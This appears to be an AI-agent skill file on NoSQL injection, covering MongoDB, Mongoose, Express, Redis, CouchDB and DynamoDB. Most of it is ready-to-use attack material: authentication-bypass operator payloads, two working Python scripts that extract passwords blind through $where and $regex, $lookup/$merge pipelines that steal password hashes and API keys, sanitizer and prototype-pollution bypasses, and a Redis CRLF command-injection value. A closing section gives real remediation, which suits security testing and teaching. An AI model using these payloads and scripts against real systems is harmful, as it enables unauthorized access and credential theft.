---
name: nosqli
description: NoSQL injection - MongoDB operator injection ($ne/$gt/$regex/$where), authentication bypass, blind data extraction, and Mongoose/Express query-parser abuse
---

# NoSQL Injection

Systematically detect, exploit, and remediate NoSQL injection vulnerabilities — primarily MongoDB operator injection through JSON bodies and Express query-string parsers, plus secondary surfaces in Redis, CouchDB, and DynamoDB. Unlike SQL injection, NoSQL injection rarely requires quote-breaking: the attacker supplies *structured data* (objects, arrays, operators) that the application passes straight into the query engine.

## When to use this skill

Apply this skill when any of the following is true:

- The target is a Node.js/Express, Mongoose, or MEAN/MERN stack application, or any backend that accepts JSON request bodies and forwards them to `find()`, `findOne()`, `updateOne()`, `deleteOne()`, or an aggregation pipeline.
- Login, password-reset, token-verification, or search endpoints accept `user`/`email`/`pass` style fields and return different responses for unusual inputs (empty strings, arrays, objects) than for garbage strings.
- Query parameters use bracket syntax (`?user[$ne]=x`, `?filter[0][$gt]=`) or the endpoint accepts nested JSON filters — a strong signal that the Express `qs` parser (extended mode) or a document deserializer is re-hydrating user input into objects.
- SQL injection tests (`'`, `"`, `--`, `UNION SELECT`) all fail, but the backend still behaves like a database-driven app — the classic NoSQL pivot.
- The app uses Mongoose with `lean()` queries, `strict: false` schemas, or passes `req.body`/`req.query` objects directly into queries without schema validation.
- Error messages mention BSON casting (`Cast to ObjectId failed`, `Cannot use $regex on a string`), which confirms a MongoDB backend and reveals which fields are cast vs. passed raw.

## Methodology

### 1. Fingerprint the NoSQL backend

Before injecting, determine which store and driver layer you are talking to. Each backend leaks differently:

- **MongoDB behind Express/Mongoose**: error strings like `Cast to [type] failed for value`, `MongoServerError`, `E11000 duplicate key`, `BSONTypeError`, or `Topology was destroyed`. Responses to `?user[$ne]=` style params that change behavior (login succeeds, or a 500 with a cast error) confirm operator objects survive parsing.
- **MongoDB timing probe**: `$where` with a sleep payload changes response time only on MongoDB with server-side JS enabled:
  ```json
  {"user": {"$where": "sleep(3000) || true"}, "pass": "x"}
  ```
  A ~3s delay is a definitive MongoDB fingerprint and simultaneously proves `$where` is enabled.
- **CouchDB**: responses carry the `Server: CouchDB/x.y.z` header; endpoints like `/_session`, `/_all_dbs`, `/_uuids` respond with JSON `{"error":"unauthorized"}` shapes; view queries use `?key=`/`?startkey=` URL params rather than operators.
- **Redis**: not queryable over HTTP directly, but exposed via SSRF, CRLF injection into key names (`session:%0d%0aCONFIG%20GET%20*`), or Node clients that interpolate user input into commands. Fingerprint via `X-Redis`-style headers on caching layers or by observing cache-busting behavior (`Cache-Control` differences when you mutate a session key).
- **DynamoDB**: AWS SDK errors (`ValidationException`, `The provided expression refers to an attribute that does not exist`) reveal `KeyConditionExpression`/`FilterExpression` built by string concatenation. Injection surface is limited to attribute-name/value substitution bugs — test with `#`/`:` placeholder confusion and `OR` keyword injection into concatenated filter strings.
- **Behavioral differential**: send the same field as a string, then as an array, then as an object. A backend that accepts all three without a 400/422 is almost certainly passing raw parsed input into the query layer.

### 2. JSON operator injection in the request body

If the API accepts JSON and forwards fields into queries, operators survive as BSON objects. Start with the canonical authentication bypass:

```json
POST /login
Content-Type: application/json

{"user": {"$ne": ""}, "pass": {"$ne": ""}}
```

This translates to `db.users.find({user: {$ne: ""}, pass: {$ne: ""}})` and matches the first document whose username and password are both non-empty — i.e., any user. Variants to rotate through:

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}
{"user": {"$exists": true}, "pass": {"$exists": true}}
{"user": {"$in": ["admin", "root", "administrator"]}, "pass": {"$ne": ""}}
{"user": "admin", "pass": {"$ne": "invalid"}}
{"user": "admin", "pass": {"$not": {"$eq": "wrong"}}}
{"user": {"$type": "string"}, "pass": {"$type": "string"}}
```

- **Type confusion**: some apps validate `typeof body.user === 'string'` server-side but the driver still accepts arrays. Try `{"user": ["admin"], "pass": {"$ne": ""}}` — arrays match array-typed fields or coerce unexpectedly.
- **Null bypass**: `{"user": null, "pass": null}` matches documents where fields are missing entirely, which succeeds against sparse schemas.
- **NoSQLi in update/delete**: `{"_id": {"$ne": null}}` in a DELETE body can wipe every document; `{"$set": {"role": "admin"}}` inside a loosely-merged update body is mass-assignment via operator injection.

### 3. `$regex` anchored extraction (blind password harvesting)

When login tells you *which* username is valid but not the password, use `$regex` with an anchor to test the password character-by-character. The query `pass: {$regex: "^a"}` matches only if the stored password starts with `a`:

```json
POST /login
{"user": "admin", "pass": {"$regex": "^a"}}
```

- HTTP 200 / "logged in" → password starts with `a`.
- HTTP 401 → wrong character; advance the alphabet.
- Iterate: `^a`, `^b`, ... `^z`, then `^0-9`, then symbols. Once the first character is known, test `^aX`, `^aY`, ... to grow the prefix.
- Case sensitivity: `$regex` is case-sensitive by default; add `{"$options": "i"}` only if the app stores case-insensitive hashes (rare — usually you want exact case).
- Special characters in the password: escape regex metacharacters (`\`, `^`, `$`, `.`, `*`, `+`, `?`, `(`, `)`, `[`, `]`, `{`, `}`, `|`) with a backslash when testing them literally.
- End detection: when no single character extends the match, the password is complete — verify with `{"$regex": "^<full-password>$"}`.

### 4. URL parameter object injection via the Express `qs` parser

Express's default query parser (`qs` in extended mode) converts bracket syntax into nested objects. This means operators can be injected without any JSON body at all:

```
GET /login?user[$ne]=&pass[$ne]=
GET /login?user[$ne]=&pass[$gt]=
GET /login?user[$gt]=&pass[$gt]=
GET /search?filter[$where]=sleep(2000)
GET /profile?id[$ne]=&role=admin
```

`?user[$ne]=&pass[$ne]=` becomes `{user: {$ne: ""}, pass: {$ne: ""}}` — identical to the JSON bypass. Additional `qs`-specific tricks:

- **Dotted keys**: `?user.$ne=` also produces `{"user": {"$ne": ""}}` in some `qs` configurations (allowDots).
- **Array injection**: `?user[]=admin` produces `{"user": ["admin"]}`, which can bypass `===` string checks or match `$in`-style semantics.
- **Prototype pollution prelude**: `?__proto__[$ne]=x` or `?constructor[prototype][x]=y` — if the app merges query objects into config, this is a pollution primitive that can flip security flags (e.g., `Object.prototype.sanitized = false`).
- **`$where` via URL**: `?user[$where]=return true` — if the app passes the whole query object to `find()`, `$where` executes server-side JavaScript scoped to each document.

### 5. `$where` JavaScript injection and blind boolean extraction

`$where` executes arbitrary JavaScript per document with the document bound to `this`. It is the most powerful MongoDB injection primitive: full boolean oracle, timing oracle, and (on older versions) data exfiltration via error messages.

**Boolean oracle** — compare a field character-by-character:

```json
{"user": "admin", "pass": {"$where": "this.pass.length > 0 && this.pass[0] === 'a'"}}
```

**Timing oracle** when responses are otherwise identical:

```json
{"user": "admin", "pass": {"$where": "if (this.pass[0] === 'a') { sleep(5000); } return true;"}}
```

**Working Python extraction script** (binary-search over character codes for speed, with timing fallback):

```python
#!/usr/bin/env python3
"""Blind MongoDB $where extraction via boolean oracle."""
import requests, string, sys, time

URL = "http://target:3000/login"
FIELD = "pass"          # field to extract
USER = "admin"          # known username
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{};:,.<>/?\\|`~\"'"

def oracle(expr):
    """Return True if the JS expression evaluates truthy for the target doc."""
    body = {"user": USER, "pass": {"$where": expr}}
    try:
        r = requests.post(URL, json=body, timeout=10)
        return r.status_code == 200
    except requests.RequestException:
        return False

def extract_length():
    lo, hi = 1, 128
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"this.{FIELD}.length > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_value():
    length = extract_length()
    print(f"[+] {FIELD} length: {length}")
    result = ""
    for i in range(length):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            expr = (f"this.{FIELD}.length === {length} && "
                    f"this.{FIELD}.charCodeAt({i}) > {mid}")
            if oracle(expr):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)
        print(f"[+] {FIELD}[{i}] = {chr(lo)}  ->  {result}")
    return result

if __name__ == "__main__":
    print("[*] Extracted:", extract_value())
```

Notes on the script:
- Binary search over `charCodeAt` cuts requests from ~95/char (linear charset) to ~7/char.
- If the app returns 200 for both true and false, switch to the timing oracle: replace `oracle()` with a version that measures `r.elapsed.total_seconds()` against a baseline threshold.
- If `$where` is disabled (`--noscripting`), fall back to `$regex` (section 3) — same loop, different operator.

### 6. `$regex` blind extraction loop (no-JS fallback)

When `$where` is disabled but `$regex` works, the same binary-search idea applies using regex character classes:

```python
#!/usr/bin/env python3
"""Blind MongoDB $regex password extraction."""
import requests, string

URL = "http://target:3000/login"
USER = "admin"
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"

def test(prefix):
    body = {"user": USER, "pass": {"$regex": f"^{prefix}"}}
    return requests.post(URL, json=body, timeout=10).status_code == 200

def extract():
    known = ""
    while True:
        found = False
        for c in CHARSET:
            if test(known + c):
                known += c
                print(f"[+] {known}")
                found = True
                break
        if not found:
            break
    return known

if __name__ == "__main__":
    print("[*] Password:", extract())
```

Optimization: use character classes to bisect — `^[a-m]` vs `^[n-z]` halves the search space per request, then recurse into the winning half. This is the regex equivalent of the `charCodeAt` binary search and reduces total requests dramatically.

### 7. Aggregation pipeline injection ($lookup data theft)

If the app accepts a JSON filter/pipeline and passes it to `aggregate()`, `$lookup` lets you join across collections and exfiltrate data you should not be able to read:

```json
POST /api/search
{"filter": [
  {"$match": {"role": "user"}},
  {"$lookup": {
      "from": "users",
      "localField": "email",
      "foreignField": "email",
      "as": "leak"
  }},
  {"$unwind": "$leak"},
  {"$match": {"leak.role": "admin"}},
  {"$project": {"leak.passwordHash": 1, "leak.apiKey": 1, "_id": 0}}
]}
```

- If the app wraps your input as `{$match: <your-input>}` only, you cannot inject pipeline stages — but you can still inject operators *inside* the match (all of section 2 applies).
- If the app accepts an array of stages (common in "advanced filter" UIs), full pipeline injection is possible: `$lookup` into any collection, `$out`/`$merge` to write into collections you can then read, `$unionWith` (MongoDB 4.4+) to pull in entire other collections.
- `$out`/`$merge` abuse: `{"$merge": {"into": "public_data"}}` copies stolen data into a collection the app exposes publicly — a two-stage exfiltration that avoids response-size limits.
- Cross-database `$lookup` requires `from` to be in the same database unless the app user has `clusterManager`-level rights; test both same-db and cross-db collection names.

### 8. Mongoose-specific attacks

Mongoose adds its own parsing and casting layer, which creates distinct bypasses:

- **`sanitize-filter` / `express-mongo-sanitize` bypasses**: these middlewares strip keys starting with `$` from `req.body`/`req.query`/`req.params`. Bypasses include:
  - Nested keys they don't recurse into: `{"a": {"b": {"$ne": null}}}` — older versions only sanitized the top level.
  - Dotted keys arriving post-parse: `?user.$ne=` may survive if the sanitizer checks literal `$`-prefixed keys only.
  - `req.body` reassignment after middleware runs (middleware order bugs), or input reaching the query via `req.headers`, cookies, or JWT claims that were never sanitized.
  - Prototype-pollution to disable the sanitizer: `?__proto__[sanitize]=false` against vulnerable merge implementations.
- **`toString()` cast attacks on Express 4 `qs` extended mode**: when the app does `User.find({user: req.query.user})` and Mongoose casts to string, an object like `?user[$ne]=` fails casting — but `?user[$gt]=` inside a *string-cast* context can still produce `{"$gt": ""}` if the app uses `lean()` or bypasses schema casting. More reliably, if the app concatenates or interpolates (`"user=" + req.query.user`), objects coerce via `toString()`, producing `[object Object]` — detectable, and in some template/ORM combinations the coercion happens *after* operator parsing, so test both orders.
- **`populate()` abuse**: if the app does `Model.findById(id).populate(req.query.expand)`, you control which related collection is joined:
  ```
  GET /api/orders/507f1f77bcf86cd799439011?expand=passwordHashes
  GET /api/orders/507f1f77bcf86cd799439011?expand=users.admins
  ```
  Path traversal in `populate` (`a.b.c`) walks into nested schemas; supplying a non-schema path can leak internal fields or trigger 500s that reveal schema structure. If `populate` accepts an object, `{"path": "x", "match": {"role": "admin"}, "select": "password -_id"}` gives you filtered, projected data theft.
- **Strict mode gaps**: `strict: false` schemas accept arbitrary fields, so `{"$set": {"isAdmin": true}}` in an update body sticks. Even with `strict: true`, `strictQuery` defaults changed across Mongoose versions (5→6→7), meaning unknown *query* fields may be silently passed through or silently dropped — test `?isAdmin=true` on list endpoints to see which behavior you get.
- **Cast error oracle**: Mongoose throws `CastError` for invalid ObjectId/Date/Number. Use this to enumerate valid field names and types: `?createdAt[$gte]=not-a-date` → 500 with `Cast to Date failed` confirms the field exists and is Date-typed.

### 9. Redis, CouchDB, and DynamoDB injection surfaces

- **Redis**: injection happens through command construction, not operators. If user input lands in a key name or command argument:
  - CRLF injection: `session:abc%0d%0aCONFIG%20GET%20*` — if the client library doesn't escape, you inject a second command.
  - Key-template injection: `GET user:{input}:profile` where `input` contains `*` or `?` turns an exact GET into a KEYS-style scan via `SCAN`/`KEYS` patterns.
  - Lua script injection (`EVAL`) if the app interpolates input into `eval()` calls — equivalent to MongoDB `$where`.
- **CouchDB**: injection is via view/query parameters: `?startkey="a"&endkey="b\uffff"` range manipulation, `?key=<user-controlled>` to read other tenants' documents if views aren't per-tenant, and `_design` document injection if you can write design docs (arbitrary JS in `map`/`reduce` functions — server-side JS execution). Also test `/_session` for `AuthSession` token manipulation and `/_replicator` for pulling data to an external database.
- **DynamoDB**: injection surface is narrow — `KeyConditionExpression` and `FilterExpression` built by string concatenation. Test `OR` injection: if the app builds `FilterExpression: "status = :s" + userFilter`, submitting ` OR attribute_not_exists(role)` may widen the filter. Attribute-name substitution bugs (`#name` placeholders) can also be abused if user input reaches the `ExpressionAttributeNames` map keys.

### 10. Verification workflow

After any successful injection, confirm impact before reporting:

1. Reproduce the bypass with the minimal payload (e.g., `{"user": {"$ne": ""}, "pass": {"$ne": ""}}`) and capture the full request/response pair.
2. Determine which account you landed on (response body, `/me` endpoint, JWT claims) — "logged in as first user in collection" is the typical outcome.
3. Quantify data exposure: how many fields, how many documents, whether cross-tenant data is reachable via `$lookup`/`populate`.
4. Test write operations (`$set`, `$merge`, `$out`) in a sandbox or against a test document only — never modify production data during assessment.

## Tooling

- **NoSQLMap**: automated NoSQLi scanner (`python nosqlmap.py -u http://target/login --attack 1 --os 2`) — handles auth-bypass operator fuzzing and `$regex`/`$where` extraction loops automatically. Point it at POST endpoints with JSON bodies; it detects the backend and iterates operator payloads.
- **Burp Suite**: use the JSON view in the message editor to edit nested operator payloads without breaking syntax; Intruder with a payload list of operators (`$ne`, `$gt`, `$regex`, `$where`, `$exists`, `$in`, `$nin`, `$type`, `$not`, `$all`, `$elemMatch`, `$size`) and a "grep - match" rule on response length/status to spot differentials. Save the operator list as a custom payload set for reuse.
- **Custom Python scripts**: the `requests`-based extraction loops in sections 5 and 6 are the most reliable tools for blind extraction — they handle binary search, timing oracles, and charset customization better than generic scanners. Keep a template with pluggable `oracle()` functions for boolean vs. timing modes.
- **mongosh**: connect to the target MongoDB instance (if credentials are recovered or provided) to verify findings and understand the schema:
  ```bash
  mongosh "mongodb://user:pass@target:27017/appdb" --eval \
    'db.users.find({user: {$ne: ""}}).limit(1).pretty()'
  ```
  Use `db.getCollectionNames()`, `db.users.findOne()`, and `db.users.getIndexes()` to map what an injected query can reach, and to confirm which fields exist for `$regex`/`$where` targeting.
- **Express `qs` playground**: run a local Express app with `app.set('query parser', 'extended')` and log `req.query` to confirm exactly how bracket syntax is parsed before testing against the live target — this eliminates guesswork about `qs` version behavior.
- **Burp Extension / HTTP request smuggler**: for apps behind proxies, verify that operator payloads survive any WAF or reverse-proxy normalization (some WAFs strip `$` from query strings but not JSON bodies, or vice versa).

## Remediation

- **Schema validation before the database**: validate every request body and query parameter with **zod** (TypeScript) or **joi** (JavaScript) and reject anything that is not an expected primitive:
  ```javascript
  const LoginSchema = z.object({
    user: z.string().min(1).max(64),
    pass: z.string().min(8).max(128),
  });
  const { user, pass } = LoginSchema.parse(req.body); // throws on objects/arrays
  ```
  This is the single most effective control: operators are objects, and a schema that only accepts strings kills every operator payload at the edge.
- **express-mongo-sanitize limitations and Express 5**: `express-mongo-sanitize` strips `$`-prefixed keys but (a) does not sanitize nested keys in all versions, (b) does not cover `req.headers`, cookies, or JWT claims, and (c) is **removed/broken in Express 5** because Express 5 changed the default query parser and the middleware's mutation of `req.query` no longer works reliably. Do not rely on it as a primary control — prefer schema validation, and if you must sanitize, do it explicitly on a validated, whitelisted field list rather than mutating `req.query` in place.
- **Disable `$where` and server-side JavaScript**: run `mongod --noscripting` (or `setParameter scriptingEnabled=false` on each node). This kills `$where`, `$function`, and `$accumulator` injection outright. If you genuinely need server-side JS, isolate it in a dedicated, locked-down user with no access to sensitive collections.
- **MongoDB least-privilege roles**: the application user should hold only the roles it needs on its own database — typically `readWrite` on `appdb`, never `root`, `dbAdmin`, `clusterManager`, or `userAdmin`. Restrict `find`/`aggregate` on sensitive collections with collection-level `privileges` if using custom roles, and enable `authentication` + TLS on all nodes.
- **Mongoose strict mode and cast enforcement**: set `strict: true` (default in Mongoose 6+) and `strictQuery: true` explicitly so unknown query fields are dropped rather than passed through. Use `Schema.Types.ObjectId` with `cast` error handling, and avoid `lean()` on endpoints that accept user-controlled filters — `lean()` skips some casting/validation paths. Never pass `req.body` directly into `Model.updateOne()`; build the update object field-by-field from validated input.
- **Disable dangerous operators at the driver level**: for Mongoose, use `sanitizeFilter: true` in connection options (Mongoose 6+) which wraps user input in `{$eq: ...}` to neutralize operators, and reject any query object containing keys starting with `$` before it reaches the driver.
- **Aggregation hardening**: never accept raw pipeline stages from clients. If you need flexible filtering, accept a validated filter object and construct the pipeline server-side; explicitly reject `$lookup`, `$unionWith`, `$out`, `$merge`, `$function`, and `$accumulator` in any user-supplied stage list.
- **Redis/CouchDB/DynamoDB hardening**: escape or allowlist all user input used in Redis key names and command arguments (reject `\r`, `\n`, and whitespace); require authentication on Redis (`requirepass`) and rename dangerous commands; for CouchDB, validate `startkey`/`endkey` ranges and prevent design-doc writes from application users; for DynamoDB, always use parameterized `ExpressionAttributeValues`/`ExpressionAttributeNames` — never build expression strings by concatenation.
- **Logging and alerting**: log and alert on any request containing `$`-prefixed keys in bodies or query strings, `$where`/`$function`/`$lookup` appearing in slow-query logs, and repeated 401s with varying `$regex` prefixes (the signature of blind extraction). These signals catch both automated scanning and manual exploitation early.
- **Defense in depth**: combine edge validation (zod/joi), driver-level sanitization (Mongoose `sanitizeFilter`), database least privilege, and server-side JS disabled — no single layer is sufficient, and the history of `express-mongo-sanitize` bypasses shows that middleware-only approaches fail silently across framework upgrades.

Every finding should be reported with the exact payload, the affected endpoint, the data exposed, and the specific missing control (schema validation, strict mode, or role restriction) so the fix is unambiguous and verifiable.

## Verification & Deliverables
A complete engagement run of this skill produces:
- Authentication-bypass proof: login request with `[$ne]`/`[$regex]` payload returning an authenticated session for an unknown account.
- Operator injection matrix: responses/diffs for `$where`, `$regex`, `$gt`, `$expr` probes on each injectable parameter.
- Timing measurement for `$where` blind extraction (baseline vs payload latency) and the characters recovered.
- Data extracted (collections/fields) or demonstrated access, captured as evidence.
- Remediation: driver-safe query builders, server-side schema validation, no direct operator pass-through — re-tested.
If any artifact is missing, the test is incomplete — return to the corresponding methodology step.
